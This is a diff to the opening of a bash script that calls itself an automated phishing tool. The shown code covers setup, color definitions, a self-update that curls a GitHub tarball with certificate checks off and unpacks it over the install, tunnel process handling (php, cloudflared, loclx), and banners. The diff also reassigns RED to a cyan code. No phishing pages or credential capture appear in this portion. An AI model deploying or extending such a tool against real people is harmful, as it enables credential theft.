@@ -1,11 +1,8 @@
 #!/bin/bash
-
 ##   hfisher 	: 	Automated Phishing Tool
 ##   Author 	: 	imshown 
 ##   Version 	: 	1.0.5
 ##   Github 	: 	https://github.com/hsecurities/hfisher
-
-
 ##                   GNU GENERAL PUBLIC LICENSE
 ##                    Version 3, 29 June 2007
 ##
@@ -78,22 +75,15 @@
 ##
 ##      Copyright (C) 2025  hsecurities (https://github.com/hsecurities)
 ##
-
-
 __version__="1.0.5"
 
-## DEFAULT HOST & PORT
 HOST='127.0.0.1'
 PORT='8080' 
-
-## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
 MAGENTA="$(printf '\033[35m')"  RED="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
 REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
 MAGENTABG="$(printf '\033[45m')"  REDBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
 RESETBG="$(printf '\e[0m\n')"
-
-## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
 
 if [[ ! -d ".server" ]]; then
@@ -111,7 +101,6 @@ else
 	mkdir -p ".server/www"
 fi
 
-## Remove logfile
 if [[ -e ".server/.loclx" ]]; then
 	rm -rf ".server/.loclx"
 fi
@@ -120,7 +109,6 @@ if [[ -e ".server/.cld.log" ]]; then
 	rm -rf ".server/.cld.log"
 fi
 
-## Script termination
 exit_on_signal_SIGINT() {
 	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
 	exit 0
@@ -134,14 +122,12 @@ exit_on_signal_SIGTERM() {
 trap exit_on_signal_SIGINT SIGINT
 trap exit_on_signal_SIGTERM SIGTERM
 
-## Reset terminal colors
 reset_color() {
-	tput sgr0   # reset attributes
-	tput op     # reset color
+	tput sgr0
+	tput op
 	return
 }
 
-## Kill already running process
 kill_pid() {
 	check_PID="php cloudflared loclx"
 	for process in ${check_PID}; do
@@ -151,13 +137,11 @@ kill_pid() {
 	done
 }
 
-# Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Checking for update : "
 	relase_url='https://api.github.com/repos/hsecurities/hfisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
 	tarball_url="https://github.com/hsecurities/hfisher/archive/refs/tags/${new_version}.tar.gz"
-
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
 		sleep 2
@@ -165,7 +149,6 @@ check_update(){
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
 		--retry 3 --retry-delay 2 --location --output ".hfisher.tar.gz" "${tarball_url}"
-
 		if [[ -e ".hfisher.tar.gz" ]]; then
 			tar -xf .hfisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
@@ -182,15 +165,11 @@ check_update(){
 		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
 	fi
 }
-
-## Check Internet Status
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${RED} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
 	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
 }
-
-## Banner
 banner() {
 	cat <<- EOF
 		${BLUE}
@@ -200,13 +179,9 @@ banner() {
 		${BLUE}|   Y  \|     \   |  |\___ \|   Y  \  ___/|  | \/
 		${BLUE}|___|  /\___  /   |__/____  >___|  /\___  >__|   
 		${BLUE}\/     \/            \/     \/     \/ ${RED}Version : ${__version__}      
-
-
 		${GREEN}[${WHITE}-${BLUE}]${RED} Tool Created by hsecurities (imshown)${WHITE}
 	EOF
 }
-
-## Small Banner
 banner_small() {
 	cat <<- EOF
 		${RED}
@@ -220,8 +195,6 @@ banner_small() {
 		${RED}|_||_||_|    |_|/__/|_||_|\___| |_|   
 	EOF
 }
-
-## Dependencies
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${ORANGE}]${RED} Installing required packages..."
 
